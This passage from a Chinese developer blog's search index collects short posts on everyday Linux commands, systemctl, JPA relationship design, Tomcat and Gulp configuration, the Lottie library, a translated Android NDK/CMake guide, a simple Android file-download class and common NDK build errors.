x11-commonemqttd.dpkg-new networking rcS skeletonfriendly-recovery ondemand README sshroot@bogon:/etc/init.d# 每个开发人员都应该知道的 10 个 Linux 命令来源12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535410. file返回一个指定文件的信息。例如，你可以用它来输出一个图片文件的尺寸信息。file logo.png输出结果：&gt; PNG image data, 16 x 16, 8-bit/color RGBA, non-interlaced9. iotop, powertop, nethogs你如何监控Linux系统中发生了什么？这三个命令可以帮上大忙；* iotop: 将进程按磁盘写次数排序，并且显示程序写磁盘的次数和频率。* powertop: 将进程按能量消耗列表显示。这是一个重要的命令，尤其是当你在外面不能为你的电脑充电的时候。* nethogs: 将进程按网络流量列表显示。8. teetee 将程序的输出结果重定向，使得我们可以同时显示和保存结果，例如，添加一个新的条目到hosts文件中:echo &quot;127.0.0.1 foobar&quot; | sudo tee -a /etc/hosts7. pidof, kill and pkill这三个重要命令帮助你控制系统中运行的程序。pidof 打印出正在运行程序的进程ID。例如，下面的命令将输出nginx的进程ID:pidof nginx你可以把nginx的进程ID输入到 kill 命令来终止它。kill -USR2 $(pidof nginx)&apos;pkill 是一个快捷命令，可以终止匹配的进程:pkill -f nginx6. tmux如果还你没有安装tmux，请一定安装它。 tmux是你终端的优秀窗口和会话管理器。5. tree以树状格式列出目录的内容。它有简洁的选项，比如只显示目录;tree -d6. dpkg -L查看某个软件安装了哪些文件,比如查看vsftpd：dpkg -L vsftpd |tac","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"systemctl-命令","slug":"Linux/systemctl-命令","date":"2017-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.180Z","comments":true,"path":"Linux/systemctl-命令/","link":"","permalink":"http://yoursite.com/Linux/systemctl-命令/","excerpt":"","text":"https://linux.cn/article-5926-1.html 列出所有服务（包括启用的和禁用的） systemctl list-unit-files –type=servicesystemctl start httpd.servicesystemctl restart httpd.servicesystemctl stop httpd.servicesystemctl reload httpd.servicesystemctl status httpd.service系统启动时自动启动服务 systemctl enable httpd.servicesystemctl disable httpd.service使用systemctl命令杀死服务 systemctl kill httpdsystemctl status httpd按CPU、内存、输入和输出列出控制组 systemd-cgtop","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"JPA基于User的收藏文章的关系选择","slug":"SpringBoot/SpringBoot JPA基于User的收藏文章的关系选择","date":"2017-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.188Z","comments":true,"path":"SpringBoot/SpringBoot JPA基于User的收藏文章的关系选择/","link":"","permalink":"http://yoursite.com/SpringBoot/SpringBoot JPA基于User的收藏文章的关系选择/","excerpt":"","text":"情景很多文章，很多用户，用户把喜欢的文章添加在账户下，方便查看自己的收藏记录，但是文章不在本地数据库。 一对多三张表（用户表，收藏文章表，用户-收藏文章的中间表），一个用户对应多个收藏记录，用户实体类维护关系。一个收藏记录只能被一个用户所添加，所有每次收藏，都要生成新的收藏记录。 缺点： 产生多条记录 每次获取用户实体，都有带收藏记录，比如登录等业务是不需要这部分数据的。 如果2个用户收藏同1篇文章，收藏文章表和中间表都会产生两条收藏记录 多对一两张表（用户表，收藏文章表），多个收藏记录对应一个用户，收藏文章实体类维护关系 每次都要在 收藏文章表 生成新的收藏记录。缺点： 收藏记录的内容可以重复（不同用户）2.获取收藏记录时，会把用户的所有数据都拿出来，包括密码和token这些。优点： 不污染用户实体类 数据表比较少 如果2个用户收藏同1篇文章，收藏文章表产生两条收藏记录 多对多三张表（用户表，收藏文章表，用户-收藏文章的中间表），多个用户对应多个收藏记录，用户实体类维护关系。 优点：解决多对一和一对多的数据重复缺点：和一对多的获取用户实体一样，都有收藏记录。 最后，以上三个关系还是选择多对一的关系，但是获取收藏记录带有所有的用户数据，这样也不太好，所以最后的最后，不用关系了，在多对一的基础上，用一个用户Id替代了。各种关系的具体代码看自己的项目 springboot-demo/springboot-demo-mysql 折腾这么久，还真的想用nosql算了，像mongodb的用户文档，想怎么添加收藏记录就怎么添加，哈哈！","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"Mongodb开机自启动脚本","slug":"Web后端/Mongodb开机自启动脚本","date":"2017-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.206Z","comments":true,"path":"Web后端/Mongodb开机自启动脚本/","link":"","permalink":"http://yoursite.com/Web后端/Mongodb开机自启动脚本/","excerpt":"","text":"http://blog.csdn.net/junbujianwpl/article/details/51934009 https://kelvin.mbioq.com/2016/11/12/ubuntu1610-on-the-installation-of-server-mongodb.html","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"Tomcat自定义web-apps的路径","slug":"Web后端/Tomcat自定义web-apps的路径","date":"2017-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.213Z","comments":true,"path":"Web后端/Tomcat自定义web-apps的路径/","link":"","permalink":"http://yoursite.com/Web后端/Tomcat自定义web-apps的路径/","excerpt":"","text":"server.xml的Host节点12&lt;Context path=&quot;/demo&quot; docBase=&quot;D:\\SourceCode\\MyEclipse\\KevinServlet\\WebRoot&quot; reloadable=&quot;true&quot; /&gt;&lt;Context path=&quot;/example&quot; docBase=&quot;D:\\SourceCode\\MyEclipse\\examples&quot; reloadable=&quot;true&quot; /&gt;","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"网站文档docsify","slug":"docs文档工具/网站文档docsify","date":"2017-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.228Z","comments":true,"path":"docs文档工具/网站文档docsify/","link":"","permalink":"http://yoursite.com/docs文档工具/网站文档docsify/","excerpt":"","text":"项目地址 文档传送门 ，根据网站底部的说明：此文档由 docsify 生成docsify 是一个动态生成文档网站的工具。不同于 GitBook、Hexo 的地方是它不会生成将 .md 转成 .html 文件，所有转换工作都是在运行时进行。 使用教程 其实原理就是将 https://github.com/Binaryify/NeteaseCloudMusicApi/blob/master/docs目录的md文件生成github page ，在index.html引入docsify.js","categories":[{"name":"docs文档工具","slug":"docs文档工具","permalink":"http://yoursite.com/categories/docs文档工具/"}],"tags":[{"name":"docs","slug":"docs","permalink":"http://yoursite.com/tags/docs/"}]},{"title":"Gulp的简单实用","slug":"前端/Gulp的简单使用","date":"2017-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.247Z","comments":true,"path":"前端/Gulp的简单使用/","link":"","permalink":"http://yoursite.com/前端/Gulp的简单使用/","excerpt":"","text":"1、首页全局安装gulp npm install --global gulp 2、其次局部安装gulp npm install gulp --save-dev 3、安装依赖 npm install --save-dev gulp-minify-css jshint gulp-jshint gulp-uglify gulp-rename gulp-concat gulp-clean gulp-notify 4、在项目根目录下创建一个名为 gulpfile.js 的文件123456789101112131415161718192021222324252627282930313233var gulp=require(&apos;gulp&apos;), //gulp基础库 minifycss=require(&apos;gulp-minify-css&apos;), //css压缩 concat=require(&apos;gulp-concat&apos;), //合并文件 uglify=require(&apos;gulp-uglify&apos;), //js压缩 rename=require(&apos;gulp-rename&apos;), //文件重命名 jshint=require(&apos;gulp-jshint&apos;), //js检查 notify=require(&apos;gulp-notify&apos;); //提示gulp.task(&apos;default&apos;,function()&#123; gulp.start(&apos;minifycss&apos;,&apos;minifyjs&apos;);&#125;)//css处理gulp.task(&apos;minifycss&apos;,function()&#123; return gulp.src(&apos;css/*.css&apos;) //设置css .pipe(concat(&apos;order_query.css&apos;)) //合并css文件到&quot;order_query&quot; .pipe(gulp.dest(&apos;css/&apos;)) //设置输出路径 .pipe(rename(&#123;suffix:&apos;.min&apos;&#125;)) //修改文件名 .pipe(minifycss()) //压缩文件 .pipe(gulp.dest(&apos;css/&apos;)) //输出文件目录 .pipe(notify(&#123;message:&apos;css task ok&apos;&#125;)); //提示成功&#125;);//JS处理gulp.task(&apos;minifyjs&apos;,function()&#123; return gulp.src([&apos;js/amazeui.js&apos;,&apos;js/app.js&apos;]) //选择合并的JS .pipe(concat(&apos;order_query.js&apos;)) //合并js .pipe(gulp.dest(&apos;js/&apos;)) //输出 .pipe(rename(&#123;suffix:&apos;.min&apos;&#125;)) //重命名 .pipe(uglify()) //压缩 .pipe(gulp.dest(&apos;js/&apos;)) //输出 .pipe(notify(&#123;message:&quot;js task ok&quot;&#125;)); //提示&#125;); 5、运行命令gulp","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"Lottie动画库","slug":"Android/Lottie动画库","date":"2017-04-27T11:52:36.000Z","updated":"2021-12-28T03:24:10.119Z","comments":true,"path":"Android/Lottie动画库/","link":"","permalink":"http://yoursite.com/Android/Lottie动画库/","excerpt":"","text":"【Lottie】 是Airbnb开源的一个面向 iOS、Android、React Native 的动画库，能分析 Adobe After Effects 导出的动画，并且能让原生 App 像使用静态素材一样使用这些动画，完美实现动画效果。 android 项目地址：https://github.com/airbnb/lottie-android 123dependencies &#123; implementation 'com.airbnb.android:lottie:4.2.0'&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"lottie","slug":"lottie","permalink":"http://yoursite.com/tags/lottie/"}]},{"title":"在 Android Studio 2.2 中愉快地使用 C/C++","slug":"Android/在Android Studio 2.2 中愉快地使用 C和C++","date":"2016-09-21T01:52:36.000Z","updated":"2021-12-28T03:24:10.125Z","comments":true,"path":"Android/在Android Studio 2.2 中愉快地使用 C和C++/","link":"","permalink":"http://yoursite.com/Android/在Android Studio 2.2 中愉快地使用 C和C++/","excerpt":"","text":"本翻译文章原文链接这篇文章最新的内容在 《向您的项目添加 C 和 C++ 代码》 注：官网上面的技术文章也在不断地汉化中，只是进度有点慢。在我翻译本篇文章的时候，官网没有对应的中文教程。经人提醒，该文章现在在官网已经有对应的中文版教程了，链接地址：向您的项目添加 C 和 C++代码。有需要的朋友可以直接阅读官方中文解说。 ———–分割线————- Android Studio 2.2 正式版发布后，看到更新内容中有提到对 C/C++ 支持的完善，表示非常高兴。然后将官网上这一部分内容翻译出来，如有错误，欢迎指正。原文链接：Add C and C++ Code to Your Project 使用 Android studio，你可以将 C 和 C++ 代码编译成 native library（即 .so 文件），然后打包到你的 APK 中。你的 Java 代码可以通过 Java Native Interface（JNI）调用 native library 中的方法。 Android Studio 默认使用 CMake 编译原生库。由于已经有大量的代码使用了 ndk-build 来编译 native code，所以 Android Studio 同样也支持 ndk build。如果你想导入一个 ndk-build 库到你的 Android Studio 项目中，请参阅后文的 关联本地库与 Gradle。然而，如果你创建了一个新的 native 库工程，你应该使用 CMake。 本篇文章将会说明如何使用 Android Studio 来创建、配置 Android 项目，以支持 native code，以及将其运行到你的 app 中。 注意：要在 Android Studio 中使用 CMake 或者 ndk-build，你需要使用 Android Studio 2.2 或更高的版本，同时需要配合使用 Android Plugin for Gradle 2.2.0 及以上的版本。 下载 NDK 和构建工具要编译和调试本地代码（native code），你需要下面的组件： The Android Native Development Kit (NDK): 让你能在 Android 上面使用 C 和 C++ 代码的工具集。 CMake: 外部构建工具。如果你准备只使用 ndk-build 的话，可以不使用它。 LLDB: Android Studio 上面调试本地代码的工具。 你可以使用 SDK Manager 来安装上述组件： 打开一个项目，从菜单栏中选择 Tools &gt; Android &gt; SDK Manager。 点击 SDK Tools 选项卡。 勾选 LLDB，CMake 和 NDK。 点击 Apply，然后点击 OK。 当安装完成后，点击 Finish，然后点击 OK 创建支持 C/C++ 的新项目创建一个支持 native code 的项目和创建普通的 Android studio 工程很像。但是有几点需要留意的地方： 在 Configure your new project 选项中，勾选 Include C++ Support 选项。 点击 Next，后面的流程和创建普通的 Android studio 工程一样。 在 Customize C++ Support 选项卡中。你有下面几种方式来自定义你的项目： C++ Standard：点击下拉框，可以选择标准 C++，或者选择默认 CMake 设置的 Toolchain Default 选项。 Exceptions Support：如果你想使用有关 C++ 异常处理的支持，就勾选它。勾选之后，Android Studio 会在 module 层的 build.gradle 文件中的 cppFlags 中添加 -fexcetions 标志。 Runtime Type Information Support：如果你想支持 RTTI，那么就勾选它。勾选之后，Android Studio 会在 module 层的 build.gradle 文件中的 cppFlags 中添加 -frtti 标志。 点击 “Finish” 当 Android Studio 完成新项目创建后，打开 Project 面板，选择 Android 视图。Android Studio 会添加 cpp 和 External Build Files 目录。 cpp 目录存放你所有 native code 的地方，包括源码，头文件，预编译项目等。对于新项目，Android Studio 创建了一个 C++ 模板文件：native-lib.cpp，并且将该文件放到了你的 app 模块的 src/main/cpp/目录下。这份模板代码提供了一个简答的 C++ 函数：stringFromJNI()，该函数返回一个字符串：”Hello from C++”。 External Build Files 目录是存放 CMake 或 ndk-build 构建脚本的地方。有点类似于 build.gradle 文件告诉 Gradle 如何编译你的 APP 一样，CMake 和 ndk-build 也需要一个脚本来告知如何编译你的 native library。对于一个新的项目，Android Studio 创建了一个 CMake 脚本：CMakeLists.txt，并且将其放到了你的 module 的根目录下。 编译运行示例 APP当你点击 Run 按钮，Android Studio 会编译并启动一个 APP ，然后在 APP 中显示一段文字”Hello from C++”。从编译到运行示例 APP 的流程简单归纳如下： Gradle 调用外部构建脚本，也就是 CMakeLists.txt。 CMake 会根据构建脚本的指令去编译一个 C++ 源文件，也就是 native-lib.cpp，并将编译后的产物扔进共享对象库中，并将其命名为 libnative-lib.so，然后 Gradle 将其打包到 APK 中。 在运行期间，APP 的 MainActivity 会调用 System.loadLibrary() 方法，加载 native library。而这个库的原生函数，stringFromJNI()，就可以为 APP 所用了。 MainActivity.onCreate() 方法会调用 stringFromJNI()，然后返回 “Hello from C++”，并更新 TextView 的显示。 注意：Instant Run 并不兼容使用了 native code 的项目。Android Studio 会自动禁止 Instant Run 功能。 如果你想验证一下 Gradle 是否将 native library 打包进了 APK，你可以使用 APK Analyzer: 选择 Build &gt; Analyze APK。 从 app/build/outputs/apk/ 路径中选择 APK，并点击 OK。 如下图，在 APK Analyzer 窗口中，选择 lib//，你就可以看见 libnative-lib.so 将 C/C++ 代码添加到现有的项目中如果你想将 native code 添加到一个现有的项目中，请按照下面的步骤操作： 创建新的 native source 文件，并将其添加到你的 Android Studio 项目中。如果你已经有了 native code，也可以跳过这一步。 创建一个 CMake 构建脚本。如果你已经有了一个 CMakeLists.txt 构建脚本，或者你想使用 ndk-build 然后有一个 Android.mk 构建脚本，也可以跳过这一步。 将你的 native library 与 Gradle 关联起来。Gradle 使用构建脚本将源码导入到你的 Android Studio 项目中，并且将你的 native library （也就是 .so 文件）打包到 APK 中。 一旦你配置好了项目，你就可以在 Java 代码中，使用 JNI 框架开调用原生函数（native functions）。只需要点击 Run 按钮，就可以编译运行你的 APP 了。 创建新的 native source 文件请按照下面的方法来创建一个 cpp/ 目录和源文件（native source files）： 打开IDE左边的 Project 面板，选择 Project 视图。 找到你项目的 module &gt; src 目录，右键点击 main 目录，选择 New &gt; Directory。 输入目录的名字（比如 cpp），然后点击 OK。 右键点击刚才创建好的目录，选择 New &gt; C/C++ Source File。 输入文件名，比如 native-lib。 在 Type 菜单下拉选项中，选择源文件的扩展后缀名，比如 .cpp。 如果你也想创建一个头文件，点击 Create an associated header 选项框。 点击 OK。 创建 CMake 构建脚本如果没有一个 CMake 构建脚本，你需要自己手动创建一个，并添加一些合适的 CMake 命令。CMake 构建脚本是一个空白的文本文档（后缀为 .txt 的文件），名字必须为 CMakeLists.txt。 注意：如果你的项目使用了 ndk-build，你就不需要创建 CMake 构建脚本，只需要提供一个路径链，将你的 Android.mk 文件链接到 Gradle 中即可。 将一个空白的文本文档变成一个 CMake 构建脚本，你需要这么做： 打开 IDE 左边的 Project 面板，选择 Project 视图。 在你的 module 根目录下，右键，选择 New &gt; File。 输入 “CMakeLists.txt” 作为文件名，并点击 OK。 现在，你可以添加 CMake 命令来配置你的构建脚本了。为了让 CMake 将源代码（native source code）编译成 native library。需要在编译文件中添加 cmake_minimum_required() 和 add_library() 命令： 1234567891011121314151617181920# Sets the minimum version of CMake required to build your native library.# This ensures that a certain set of CMake features is available to# your build.cmake_minimum_required(VERSION 3.4.1)# Specifies a library name, specifies whether the library is STATIC or# SHARED, and provides relative paths to the source code. You can# define multiple libraries by adding multiple add.library() commands,# and CMake builds them for you. When you build your app, Gradle# automatically packages shared libraries with your APK.add_library( # Specifies the name of the library. native-lib # Sets the library as a shared library. SHARED # Provides a relative path to your source file(s). src/main/cpp/native-lib.cpp ) 当你使用 add_library()，将一个源文件（source file）或库添加到你的 CMake 构建脚本，同步你的项目，然后你会发现 Android studio 将关联的头文件也显示了处理。然而，为了让 CMake 在编译时期能定位到你的头文件，你需要在 CMake 构建脚本中添加 include_directories() 命令，并指定头文件路径：1234add_library(...)# Specifies a path to native header files.include_directories(src/main/cpp/include/) 然后，按照约定，CMake 会将生成的 library 命名为下面的形式： lib*library-name*.so 比如，如果你在构建脚本中，将 library 命名为 “native-lib”，那么 CMake 会创建叫 libnative-lib.so 的文件。但是，当你将 library 加载到 Java 代码中的时候， 你需要使用在 CMake 中指定的名称：123static &#123; System.loadLibrary(“native-lib”);&#125; 注意：如果你将 CMake 脚本里面的 library 重命名了，或者移除了。你需要清理一下你的工程。在 IDE 的菜单栏中选择 Build &gt; Clean Project。 Android Studio 会在 Project 面板中的 cpp 目录中自动添加源文件和头文件。你可以多次使用 add_library()命令，来添加额外的 library。 添加 NDK APIsAndroid NDK 提供了一些有用的 native APIs。将 NDK librarys 添加到 CMakeLists.txt 脚本文件中，就可以使用这些 API 了。 预编译的 NDK librarys 已经存在在 Android 平台中了，所以你不需要编译它们，或者是将其打包到你的 APK 中。因为这些 NDK librarys 已经是 CMake 搜索路径的一部分，你甚至不需要提供你本地安装的 NDK 路径。你只需要向 CMake 提供你想使用的 library 名字。 将 find_library() 命令添加到你的 CMake 构建脚本中，这样就可以定位 NDK library 的位置，并将其位置存储在一个变量之中。你可以在构建脚本的其他地方使用这个变量，来代指 NDK library。下面的示例代码将 Android-specific log support library的位置存储到变量 log-lib 中： 1234567find_library( # Defines the name of the path variable that stores the # location of the NDK library. log-lib # Specifies the name of the NDK library that # CMake needs to locate. log ) NDK 同样也包含一些只包含源码的 library，这些就需要你去编译，然后链接到你的本地库（native library）。你可以在 CMake 构建脚本中使用 add_library() 命令将源码编译进本地库。这时就需要提供你的本地 NDK 安装路径，通常将该路径保存在 ANDROID_NDK 变量中，这样 Android Studio 可以自动为你识别。 下面的命令告诉 CMake 去构建 android_native_app_glue.c，这个命令可以管理 NativeActivity的生命周期以及点击输入，并将其导入静态库中，然后将其链接至 native-lib： 123456add_library( app-glue STATIC $&#123;ANDROID_NDK&#125;/sources/android/native_app_glue/android_native_app_glue.c )# You need to link static libraries against your shared native library.target_link_libraries( native-lib app-glue $&#123;log-lib&#125; ) 添加其他的预编译库添加预编译库和添加本地库（native library）类似。由于预编译库是已经构建好的，你想就要使用 IMPORTED 标志去告诉 CMake ，你只需要将其导入到你的项目中即可： 123add_library( imported-lib SHARED IMPORTED ) 然后你需要使用 set_target_properties() 命令去指定库的路径，就像下面的代码那样。 一些库会根据不同的 CPU 使用不同的包，或者是 Application Binary Interfaces(ABI)，并且将他们归类到不同的目录中。这样做的好处是，可以充分发挥特定的 CPU 架构。你可以使用 ANDROID_ABI 路径变量，将多个 ABI 版本的库添加到你的 CMake 构建脚本中。这个变量使用了一些 NDK 默认支持的 ABI，以及一些需要手动配置到 Gradle 的 ABI，比如： 123456789add_library(...)set_target_properties( # Specifies the target library. imported-lib # Specifies the parameter you want to define. PROPERTIES IMPORTED_LOCATION # Provides the path to the library you want to import. imported-lib/src/$&#123;ANDROID_ABI&#125;/libimported-lib.so ) 为了让 CMake 在编译时期能找到你的头文件，你需要使用 include_directories() 命令，并且将你的头文件地址传进去： 1include_directories( imported-lib/include/ ) 在 CMake 构建脚本中使用 target_link_libraries() 命令，将预构建库与你本地库相关联： 1target_link_libraries( native-lib imported-lib app-glue $&#123;log-lib&#125; ) 当你构建你的 APP 的时候，Gradle 会自动将导入的库打包到你的 APK 中。你可以使用 APK Analyzer 来检查。 关联本地库与 Gradle为了将本地库与 Gradle 相关联，你需要在 CMake 或 ndk-build 构建脚本中提供一个路径地址。当你构建你的 APP 时，Gradle 会将 CMake 或 ndk-build 作为一个依赖运行，然后将共享库（.so 文件）打包到你的 APK 中。Gradle 同样使用构建脚本来识别哪些文件需要导入到 Android Studio 项目，你可以从 Project 窗口面板中看到相应的文件。如果你还没有一个为 native sources 准备的构建脚本，你需要先创建一个。 使用 Android Studio 图形化界面你可以使用 Android Studio 的图形化界面来将 Gradle 与外部 CMake 或者 ndk-build 项目关联起来。 打开 IDE 左边的 Project 面板，选择 Android 视图。 右键点击你想链接本地库的 module，比如 app module，然后从菜单中选择 Link C++ Project with Gradle。你应该能看见一个和下图很像的对话框。 在下拉菜单中，选择 CMake 或者 ndk-build。 如果你选择 CMake，需要在 Project Path 中指定 CMakeLists.txt 脚本文件的路径。 如果你选择 ndk-build，你需要在 Project Path 中指定 Android.mk 脚本文件的路径。 点击 OK。 手动配置 Gradle如果要手动将 Gradle 与你的本地库相关联，你需要在 module 层级的 build.gradle 文件中添加 externalNativeBuild {} 代码块，并且在该代码块中配置 cmake {} 或 ndkBuild {}：12345678910111213141516android &#123; ... defaultConfig &#123;...&#125; buildTypes &#123;...&#125; // Encapsulates your external native build configurations. externalNativeBuild &#123; // Encapsulates your CMake build configurations. cmake &#123; // Provides a relative path to your CMake build script. path &quot;CMakeLists.txt&quot; &#125; &#125;&#125; 可选配置你可以在你的 module 层级的 build.gradle 文件中的 defaultConfig {} 代码块中，添加 externalNativeBuild {} 代码块，为 CMake 或 ndk-build 配置一些额外参数。当然，你也可以在你的构建配置中的其他每一个生产渠道重写这些属性。 比如，如果你的 CMake 或者 ndk-build 项目中定义了多个本地库，你想在某个生产渠道使用这些本地库中的几个，你就可以使用 targets 属性来构建和打包。下面的代码展示了一些你可能会用到的属性：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758android &#123; ... defaultConfig &#123; ... // This block is different from the one you use to link Gradle // to your CMake or ndk-build script. externalNativeBuild &#123; // For ndk-build, instead use ndkBuild &#123;&#125; cmake &#123; // Passes optional arguments to CMake. arguments &quot;-DCMAKE_VERBOSE_MAKEFILE=TRUE&quot; // Sets optional flags for the C compiler. cFlags &quot;-D_EXAMPLE_C_FLAG1&quot;, &quot;-D_EXAMPLE_C_FLAG2&quot; // Sets a flag to enable format macro constants for the C++ compiler. cppFlags &quot;-D__STDC_FORMAT_MACROS&quot; &#125; &#125; &#125; buildTypes &#123;...&#125; productFlavors &#123; ... demo &#123; ... externalNativeBuild &#123; cmake &#123; ... // Specifies which native libraries to build and package for this // product flavor. If you don&apos;t configure this property, Gradle // builds and packages all shared object libraries that you define // in your CMake or ndk-build project. targets &quot;native-lib-demo&quot; &#125; &#125; &#125; paid &#123; ... externalNativeBuild &#123; cmake &#123; ... targets &quot;native-lib-paid&quot; &#125; &#125; &#125; &#125; // You use this block to link Gradle to your CMake or ndk-build script. externalNativeBuild &#123; cmake &#123;...&#125; // or ndkBuild &#123;...&#125; &#125;&#125; 指定 ABI一般情况下，Gradle 会将你的本地库构建成 .so 文件，然后将其打包到你的 APK 中。如果你想 Gradle 构建并打包某个特定的 ABI 。你可以在你的 module 层级的 build.gradle 文件中使用 ndk.abiFilters 标签来指定他们： 12345678910111213141516171819android &#123; ... defaultConfig &#123; ... externalNativeBuild &#123; cmake &#123;...&#125; // or ndkBuild &#123;...&#125; &#125; ndk &#123; // Specifies the ABI configurations of your native // libraries Gradle should build and package with your APK. abiFilters &apos;x86&apos;, &apos;x86_64&apos;, &apos;armeabi&apos;, &apos;armeabi-v7a&apos;, &apos;arm64-v8a&apos; &#125; &#125; buildTypes &#123;...&#125; externalNativeBuild &#123;...&#125;&#125; 大多数情况，你只需要像上面的代码那样，在 ndk {} 代码块中指定 abiFilters 即可。如果你想控制 Gradle 构建、依赖你希望的东西，你就需要在 defaultConfig.externalNativeBuild.cmake {} 代码块或 defaultConfig.externalNativeBuild.ndkBuild {} 代码块中，配置其他的 abiFilters 标签。Gradle 会构建这些 ABI 配置，但是只会将 defaultConfig.ndk {} 代码块中指定的东西打包到 APk 中。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"ndk","slug":"ndk","permalink":"http://yoursite.com/tags/ndk/"}]},{"title":"Android 简单文件下载","slug":"Android/Android 简单文件下载","date":"2016-08-30T01:52:37.000Z","updated":"2021-12-28T03:24:10.108Z","comments":true,"path":"Android/Android 简单文件下载/","link":"","permalink":"http://yoursite.com/Android/Android 简单文件下载/","excerpt":"","text":"Android 上有很多优秀的第三方下载库，功能很强大，如断点续传，异步等。 为了快速下载一个小文件，有时候并不需要牛刀，利用Android自带的 java.net.HttpURLConnection 即可以完成下载，应用场景，比如小的缓存文件，用子线程同步下载即可。 步骤（经典的阻塞输入/输出流读写）： 连接 获取输入流 读取buffer写入到本地文件输出流 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105import android.util.Log;import java.io.BufferedOutputStream;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.math.BigInteger;import java.net.HttpURLConnection;import java.net.URL;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MiniFileDownload &#123; private static final String TAG = \"MiniFileDownload\"; interface DownloadCallBack&#123; void onError(Exception e); void onOK(File file); void onProgress(float progress); &#125; public static void start(String url, File saveFile, DownloadCallBack callBack) &#123; if(saveFile.exists())&#123; saveFile.delete(); &#125; if(callBack == null)&#123; return; &#125; HttpURLConnection conn; try &#123; //连接URL服务器 conn = (HttpURLConnection)new URL(url).openConnection(); conn.setConnectTimeout(3 * 1000); conn.setUseCaches(false); &#125; catch (IOException e) &#123; e.printStackTrace(); callBack.onError(e); return; &#125; InputStream is = null; BufferedOutputStream bos = null; try &#123; //判断响应码，如果服务器不响应错误，开始下载。 if (conn.getResponseCode() != 200)&#123; Log.e(TAG,\"ResponseCode = \" + conn.getResponseCode()); return; &#125; //获取文件总大小 int contentLength = conn.getContentLength(); Log.d(TAG,\"content Length = \" + contentLength); byte[] buffer = new byte[1024]; int offset = 0 ; int len; //本地文件输出流 bos = new BufferedOutputStream( new FileOutputStream(saveFile) ); //获取输入流 is = conn.getInputStream(); //循环读（下载） while ((len = is.read(buffer)) != -1) &#123; Log.d(TAG,\"read buffer len = \" + len); bos.write(buffer, 0, len); offset += len; Log.d(TAG,\"offset = \" + offset + \" ;total=\" + contentLength); //计算进度 float progress = (float)offset / (float)contentLength; Log.d(TAG,\"progress = \" + progress); //更新进度到回调，UI层可以显示下载进度 callBack.onProgress(progress); &#125; Log.d(TAG,\"ok\"); callBack.onOK(saveFile); &#125; catch (IOException e) &#123; e.printStackTrace(); callBack.onError(e); &#125;finally &#123; //关闭资源 if(is != null)&#123; try &#123; is.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; if(bos != null)&#123; try &#123; bos.flush(); bos.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; conn.disconnect(); &#125; &#125;&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"ndk","slug":"ndk","permalink":"http://yoursite.com/tags/ndk/"}]},{"title":"Android Ndk常见报错","slug":"Android/Android Ndk常见报错","date":"2016-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.094Z","comments":true,"path":"Android/Android Ndk常见报错/","link":"","permalink":"http://yoursite.com/Android/Android Ndk常见报错/","excerpt":"","text":"1. 运行时找不到so文件具体表现为：已经在libs目录添加了所有平台的so文件，但是运行是依然提示找不到so文件。 如：12java.lang.UnsatisfiedLinkError: dalvik.system.PathClassLoader[DexPathList[[zip file &quot;/data/app/com.example.ijkplayer-CyD2mFQ8g6fyehi-g_1ALQ==/base.apk&quot;],nativeLibraryDirectories=[/data/app/com.example.ijkplayer-CyD2mFQ8g6fyehi-g_1ALQ==/lib/arm64, /system/lib64, /vendor/lib64]]] couldn&apos;t find &quot;libijkffmpeg.so&quot; at java.lang.Runtime.loadLibrary0(Runtime.java:1012) 问题：编译时，jniLibs默认的路径是 /app/src/main/jniLibs ,如果so文件放在 /app/libs 需指定目录。 解决： so文件放置在 /app/src/main/jniLibs (推荐) 指定工程的so文件路径build.gradle 12345678android &#123; ... sourceSets &#123; main &#123; jniLibs.srcDirs = [&apos;libs&apos;] &#125; &#125;&#125; 2. AS提示ndk版本不匹配编译是出现错误：1No version of NDK matched the requested version 21.0.6113669. Versions available locally: 21.3.6528147 本地是：21.3.6528147版本，需要匹配21.0.6113669版本。 问题：AS没有配置NDK路径 解决：给工程配置NDK-21.3.6528147版本的路径 配置本地NDK（已经弃用）local.properties 12ndk.dir=D\\:\\\\android_sdk_4\\\\ndk\\\\21.3.6528147sdk.dir=D\\:\\\\android_sdk_4 指定NDK版本为本地的版本（推荐） build.gradle123android &#123; ndkVersion &apos;21.3.6528147&apos;&#125; 3. 不识别 ‘uint32_t’IDE提示红色错误：Unknown type name ‘uint32_t’，这个错误是由于我把CPP的代码放进一个Library Module（手动创建CMakeLists.txt等编译环境），而Library Module没有include 到Ndk C++库：“\\toolchains\\llvm\\prebuild\\windows-x86_64” .更正的方法就是将CPP代码放在 Phone Module 中编译，创建项目选择 Phone Module 时，选择 Native C++ 会自动include Ndk C++库。 用 Android Studio 创建Library Module 